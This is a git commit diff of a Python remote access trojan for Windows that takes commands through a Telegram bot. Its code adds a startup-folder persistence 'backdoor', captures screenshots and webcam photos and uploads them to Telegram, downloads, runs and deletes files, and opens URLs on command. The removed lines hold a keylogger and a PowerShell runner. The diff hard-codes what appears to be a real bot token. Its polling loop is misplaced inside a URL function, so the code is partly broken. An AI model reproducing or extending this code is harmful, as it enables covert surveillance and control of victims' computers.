70cbde77b643029bd9763e179f3b4c9e9c2abe38
lanniizz <109946002+lanniizz@users.noreply.github.com>
2022-11-29 14:01:18 +0200

    Update app.py

--- app.py
+++ app.py
@@ -1,62 +1,82 @@
-import webbrowser
-import telebot
-import telegram
-import socket
-import pyautogui
-import os 
-import cv2
-import requests
+import urllib.request, json
 import time
+import requests
+import socket
+import os 
+import pyautogui
+import cv2
 import shutil
+import getpass
 import winshell
-import subprocess
-from pynput.keyboard import Listener
-from threading import Thread
 import webbrowser
 
+commands = []
 
 #Basic bot stuff
-TOKEN = ''
-CHAT_ID = ''
-bot = telebot.TeleBot(TOKEN)
+TOKEN = '5578114547:AAGGe8WEycX1S4B_ewJZkbmGoIxdWdrZV04'
+CHAT_ID = '-1001460193965'
+api_url = f'https://api.telegram.org/bot{TOKEN}/getUpdates'
 #Ip address
 ip = socket.gethostbyname(socket.gethostname())
 bot_name = socket.gethostname()
-#AppData/Name
+#Appdata/name
 Appdata = os.getenv('APPDATA')
 
-#Send Message function 
+
+#send message function
 def send_message(text):
     url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
     results = requests.get(url_req)
 
-#Join Message
-def Join_Message():
-        text = bot_name + ": " + ip
-        url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
-        results = requests.get(url_req)
-Join_Message()
+#list command
+def list_command():
 
-#Backdoor code
+    send_message(bot_name + ": " + ip)
+
+#Backdoor function
 def backdoor():
     try:
-        #Adding file to startup
-        startup = winshell.startup()
-        Startup_Path = r"" + startup +"\\System.exe"
-        #PAth to file for startup
-        file = r"app.exe"
-        shutil.copyfile(file, Startup_Path)
+        startup_path = winshell.startup()
+        USER_NAME = getpass.getuser()
+        path = r"" + startup_path + "\\System.exe"
+        file = r"aplikaatio.exe"
+        shutil.copyfile(file, path)
         send_message("Backdoor: " + ip  + " " + "sent Successfully!")
     except:
         send_message("Cannot send backdoor!")
 
-#ls command
-def ls():
-    path = os.listdir()
-    result = '\n'.join([str(elem) for elem in path])
-    result = 'ls --→ result\n' + result
-    send_message(result)
 
+#Screenshot fucntion
+PHOTO_PATH = f'{Appdata}\Microsoft\Windows\pic.png'
+def take_screenshot():
+    send_message("Taking screenshot..!")
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save(PHOTO_PATH)
+
+    files = {'photo' :open(PHOTO_PATH,'rb')}
+    resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}",files=files )
+    return PHOTO_PATH
+
+#Webcam function
+PHOTo_PATH = f'{Appdata}\Microsoft\Windows\webcam.jpg'
+def Webcam_Picture():
+    try:
+
+        send_message("Taking picture!")
+        cap = cv2.VideoCapture(0)
+        x = 0
+        while x < 10:
+            ret, frame = cap.read()
+            if x == 4:
+                cv2.imwrite(PHOTo_PATH, frame)
+            x += 1
+        cap.release()
+        cv2.destroyAllWindows()
+
+        files = {'photo' :open(PHOTo_PATH,'rb')}
+        resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={CHAT_ID}",files=files )
+    except:
+        send_message("Cannot take webcam picture: " + ip)
 #cd ..
 def cdMinus():
     os.chdir('..')        
@@ -65,215 +85,187 @@ def cdMinus():
     send_message(currentpath)
 
 #cd to directory
-def cdTo(command_ip):
+def cdTo(dir):
     try:
-        os.chdir(command_ip)
+        os.chdir(dir)
         currentpath = (os.getcwd())
         currentpath = 'cd --→ result\n' + currentpath
         send_message(currentpath)
     except:
-        send_message("Error! check command..")   
+        send_message("Error! check command..") 
 
-#Keylogger
-def keylogger(timer):
-    filename = f"Keylogs_{ip}.txt"
-    FILE_PATH = f'{Appdata}\Microsoft\Windows\Powershell\{filename}'
-    list = []
-    def record():
-
-        def on_press(key):
-            mod = str(key)
-            if mod == "Key.space":
-                mod = "'space'"
-                list.append(" " + mod + " ")
-               
-            else:
-                new_key = mod[1]  
-                list.append(new_key)
-
-        with Listener(on_press=on_press) as ls:
-            def time_out(period_sec: int):
-                time.sleep(period_sec)
-                ls.stop()
-
-            Thread(target=time_out, args=(timer,)).start()
-            ls.join()
-    record()
-
-    str1 = ''.join(str(e) for e in list)
-    file = open(FILE_PATH, "w")
-    file.write(str1)   
-    file.close()
-    bot.send_document(chat_id=CHAT_ID, document=open(FILE_PATH, "rb"))
-    os.remove(FILE_PATH)
-
-#Screenshot code
-def take_screenshot():
-    myScreenshot = pyautogui.screenshot()
-    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\pic.png'
-    myScreenshot.save(PHOTO_PATH)
-    bot.send_message(chat_id=CHAT_ID, text=f"screenshot: " + ip)
-    bot.send_photo(chat_id=CHAT_ID, photo=open(PHOTO_PATH, 'rb'))  
-    #Deleting picture
-    os.remove(PHOTO_PATH)
-
-#Webcampicture code  
-def Webcam_Picture():
-    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\webcam.jpg'
-    cap = cv2.VideoCapture(0)
-    x = 0
-    while x < 10:
-        ret, frame = cap.read()
-        if x == 4:
-            cv2.imwrite(PHOTO_PATH, frame)
-        x += 1
-    cap.release()
-    cv2.destroyAllWindows()
-    #Sending picture
-    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\webcam.jpg'
-    bot = telegram.Bot(token=TOKEN)
-    bot.send_message(chat_id=CHAT_ID, text=f"webcam: " + ip)
-    bot.send_photo(chat_id=CHAT_ID, photo=open(PHOTO_PATH, 'rb'))
-    os.remove(PHOTO_PATH)
-
-#List command
-@bot.message_handler(commands=['list'])
-def run(message):
-    text = bot_name + ": " + ip
-    url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
-    results = requests.get(url_req)
-
-#Backdoor command
-@bot.message_handler(commands=['backdoor'])
-def fun(message):
-    #Checking if ip is right
-    command_ip = message.text
-    command_ip = command_ip.split() 
-    if ip in command_ip:
-        backdoor()
-
-    pass
-
-#Screenshot command 
-@bot.message_handler(commands=['screenshot'])
-def run(message):
-    #Checking ip
-    command_ip = message.text
-    command_ip = command_ip.split() 
-    if ip in command_ip:
-        bot.reply_to(message, "Taking picture...")
-        take_screenshot()
-    
-    if "allbots" in command_ip:
-        bot.reply_to(message, "Taking picture...")
-        take_screenshot()
-    
-#Powershell command   
-@bot.message_handler(commands=['powershell'])
-def run(message):
-        def shell():
-            command = message.text
-            command = command.split()
-            command.pop(0) and command.pop(0)
-
-            #Looping the list to string
-            command_Str = ' '.join(str(e) for e in command)
-
-            p = subprocess.Popen(
-            ['powershell', command_Str], 
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True
-            )
-            p_out, p_err = p.communicate()
-            lines = p_out.splitlines()
-            str1 = ' '.join(str(e) for e in lines)
-            send_message(str1)
-        
-        #IP check
-        command_ip = message.text
-        command_ip = command_ip.split() 
-        if ip in command_ip:
-            shell()
-        if "allbots" in command_ip:
-            shell()
-  
-#Webcam command
-@bot.message_handler(commands=['webcam'])
-def run(message):
-
-    command_ip = message.text
-    command_ip = command_ip.split() 
-    if ip in command_ip:
-        bot.reply_to(message, "Taking picture...")
-        Webcam_Picture()
-
-    if "allbots" in command_ip:
-        bot.reply_to(message, "Taking pictures...")
-        Webcam_Picture()
-
-#Keylogger command
-@bot.message_handler(commands=['keylogger'])
-def run(message):
-    command_ip = message.text
-    command_ip = command_ip.split()
+#Upload file 
+def upload_file(url):
     try:
-        timer = command_ip[2] + ".0"
-        timer = float(timer)
-        print(type(timer))
+        send_message("Uploading...")
+        r = requests.get(url, allow_redirects=True)
+        file_type = url.split(".")[-1]
+        open(f'test.{file_type}', 'wb').write(r.content)
+        send_message("File uploaded!")
 
-        if ip in command_ip:
-            send_message("Recording...")
-            keylogger(timer)
-        if "allbots" in command_ip:
-            send_message("Recording...")
-            keylogger(timer)
     except:
-        pass
+        send_message("Could not upload file")
 
-#Shell command + code
-@bot.message_handler(commands=['shell'])
-def run(message):
-    command_ip = message.text
-    command_ip = command_ip.split()
-    
-    if ip in command_ip:
+
+def getting_commands():
+
+    with urllib.request.urlopen(api_url) as url:
+        data = json.load(url)
+        #print(data)
+    original_length = str(data)
+    original_length = len(original_length)
+    ip = socket.gethostbyname(socket.gethostname())
+
+    send_message(bot_name + ": " + ip)
+    send_message("Type: '/start'")
+
+def open_url(url):
+    webbrowser.open(url)
+
+    while True:
+
+        time.sleep(2.3)
         
-        if "ls" in command_ip:
-            ls()
+        with urllib.request.urlopen(api_url) as url:
+            data = json.load(url)
+        #print(data)
+        data1 = str(data)
+        #Checking for ne messages
+        lenData = str(data)
+        lenData = len(lenData)
 
-        elif "cd" in command_ip:
-            def cd_commands():
-                if ".." in command_ip:
-                    cdMinus()
-                else:
-                    try:
-                        dir = (command_ip[3])
-                        cdTo(dir)
-                    except:
+        if lenData > original_length:
+            original_length = lenData
+            
+            #Finding command from json api
+            def find_commands():
+                command = []
+                count = 0
+
+                for i in data1:
+                
+                    if i == "/":
+                        command.append(count)
+                    count += 1
+
+                #Getting last '/' from json data
+                command = command[-1]
+                data = data1[command:]
+
+                #Getting only message
+                count = 0
+
+                for i in data:
+                    if i == "'":
+                        data = data[:count]
+                        break
+                    count += 1
+
+                command = data 
+                commands.append(command)
+            find_commands()
+
+            WholeCommand = commands[-1]
+            command = WholeCommand.split()
+            command = command[0]
+            #print(WholeCommand)
+            print(command)
+            
+            #Commands!
+            match command:
+                    
+                #list command
+                case "/list":
+                    send_message(bot_name + ": " + ip)
+ 
+                #Screenshot command
+                case "/screenshot":
+                    #Chck for ip or allbots
+                    WholeCommand = WholeCommand.split()
+                    print(WholeCommand)
+                    
+                    if ip in WholeCommand:
+                        take_screenshot()
+                        os.remove(PHOTO_PATH)
+                        
+                    elif "allbots" in WholeCommand:
+                        take_screenshot()
+                        os.remove(PHOTO_PATH)
+                        
+                    else:
                         pass
-            cd_commands()
 
-        elif "get" in command_ip:
-            file = command_ip[-1]
-            dockfile = open(file, "rb")
+                #Webcam command
+                case "/webcam":
+                    WholeCommand = WholeCommand.split()
+                    print(WholeCommand)
 
-            try:
-                bot.send_document(chat_id=CHAT_ID, document=dockfile)
-                dockfile.close()
-            except:
-                send_message("Could not send file")
+                    if ip in WholeCommand:
+                        Webcam_Picture()
+                        os.remove(PHOTo_PATH)
 
-@bot.message_handler(commands=['url'])
-def run(message):
-    command_ip = message.text
-    command_ip = command_ip.split()
-    if ip in command_ip:
-        url = command_ip[2]            
-        try:
-            webbrowser.open(url)
-        except:
-            pass
+                    elif "allbots" in WholeCommand:
+                        Webcam_Picture()
+                        os.remove(PHOTo_PATH)                  
 
-def main():
-    bot.polling()
-if __name__ == '__main__':
-    main()
+                #shell command
+                case "/shell":
+                    WholeCommand = WholeCommand.split()
+                    print(WholeCommand)
+
+                    if ip in WholeCommand:
+
+                        if WholeCommand[-1] == "ls":
+                            path = os.listdir()
+                            result = '\n'.join([str(elem) for elem in path])
+                            result = 'ls --→ result\n' + result
+                            send_message(result)
+                        
+                        elif "cd" in WholeCommand:
+
+                            if ".." in WholeCommand:
+                                cdMinus()
+                            else:
+                                try:
+                                    dir = (WholeCommand[3])
+                                    cdTo(dir)
+                                except:
+                                    pass
+
+                #Upload command 
+                case "/upload":
+                    WholeCommand = WholeCommand.split()
+
+                    if ip in WholeCommand:
+                        url = WholeCommand[2]
+
+                        upload_file(url)
+
+                #Run command
+                case "/run":
+                    WholeCommand = WholeCommand.split()
+
+                    if ip in WholeCommand:
+                        try:
+                            os.startfile(WholeCommand[2])
+                            send_message("File runned!")
+                        except:
+                            send_message("Cannot open run file")
+
+                #Delete file       
+                case "/del":
+                    WholeCommand = WholeCommand.split()
+
+                    if ip in WholeCommand:
+                        file = WholeCommand[2   ]
+                        os.remove(file)
+
+                #Open url 
+                case "/url":
+                    WholeCommand = WholeCommand.split()
+                    url = WholeCommand[-1]
+                    
+                    if ip in WholeCommand:
+                        open_url(url)                        
+getting_commands()
+
